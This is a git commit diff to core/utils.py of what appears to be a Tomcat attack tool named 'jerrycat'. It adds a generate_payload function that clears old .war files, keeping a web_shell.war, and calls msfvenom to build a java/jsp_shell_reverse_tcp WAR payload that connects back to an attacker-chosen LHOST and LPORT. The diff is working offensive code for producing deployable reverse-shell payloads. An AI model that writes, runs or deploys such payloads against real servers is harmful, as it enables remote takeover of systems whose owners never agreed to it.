7ff9dee33bf856b7295e43beece27a26346c6929
StopThatTalace <0x.88ta.ko@gmail.com>
2024-09-02 20:01:01 +0200

    Refacto on generate payload reverse shell

--- core/utils.py
+++ core/utils.py
@@ -1,9 +1,28 @@
+import glob
+import os
+import subprocess
 import requests
 from requests.auth import HTTPBasicAuth
 
 from jerrycat import output_class
 
 output = output_class()
+
+def generate_payload(filename: str, lhost: str, lport: str) -> str:
+    resources_path = os.path.abspath("resources")
+    print(resources_path)
+
+    war_files = glob.glob(os.path.join(resources_path, "*.war"))
+
+    for war_file in war_files:
+        if not 'web_shell.war' in war_file:
+            os.remove(war_file)
+
+    subprocess.run(
+        ["msfvenom", "-p", "java/jsp_shell_reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}",
+         "-f", "war", "-o", f"{filename}.war"], cwd=resources_path, check=True, capture_output=True)
+
+    return filename
 
 
 def version_detection(url, **kwargs):
